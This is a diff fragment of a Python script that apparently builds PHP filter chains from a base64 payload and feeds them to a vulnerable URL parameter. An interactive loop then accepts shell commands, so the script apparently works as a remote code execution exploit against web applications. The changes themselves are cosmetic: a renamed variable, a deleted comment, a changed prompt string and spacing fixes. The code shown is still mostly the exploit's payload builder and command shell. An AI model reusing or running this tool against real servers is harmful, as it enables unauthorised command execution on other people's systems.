@@ -74,14 +74,12 @@ def chain(base64_payload):
         '=': ''
     }
 
-    # this is to generate garbage base64 code
     filters = "convert.iconv.UTF8.CSISO2022KR|"
     filters += "convert.base64-encode|"
     filters += "convert.iconv.UTF8.UTF7|"
 
-
-    for c in base64_payload[::-1]:
-            filters += conversions[c] + "|"
+    for char in base64_payload[::-1]:
+            filters += conversions[char] + "|"
             filters += "convert.base64-decode|"
             filters += "convert.base64-encode|"
             filters += "convert.iconv.UTF8.UTF7|"
@@ -98,7 +96,7 @@ def RCE(url,vulnerable_parameter):
             base64_payload = base64_payload[:-1]
     final_payload = chain(base64_payload)
     while True:
-        command = input("Enter a command: ")
+        command = input("Enter a command $ ")
         if command.lower() == "exit":
             print("\nGoodbye!")
             exit(0)
@@ -152,7 +150,7 @@ def main():
             print("Invalid choice. Please choose using (1 or 2).\n")
 
 
-if __name__=="__main__":
+if __name__ == "__main__":
     try:
         print(''' 
          _____     ________  _____             _______       ______  ________  
